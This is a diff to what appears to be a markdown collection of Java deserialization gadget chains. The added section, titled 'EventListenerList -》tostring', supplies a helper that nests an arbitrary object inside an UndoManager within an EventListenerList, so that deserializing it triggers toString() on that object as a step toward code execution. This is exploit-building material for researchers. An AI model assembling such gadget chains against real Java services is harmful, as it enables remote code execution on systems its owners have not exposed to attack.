@@ -75,8 +75,19 @@
     }
 ```
 
+### EventListenerList -》tostring
 
-
+```
+public static  EventListenerList  eventtostring(Object o) throws Exception{
+    Reflections(utils.class);
+    EventListenerList list = new EventListenerList();
+    UndoManager manager = new UndoManager();
+    Vector vector = (Vector) getFieldValue(manager, "edits");
+    vector.add(o);
+    setFieldValue(list, "listenerList", new Object[] { Map.class, manager });
+    return list;
+}
+```
 
 
 ### concurrentmap->compare
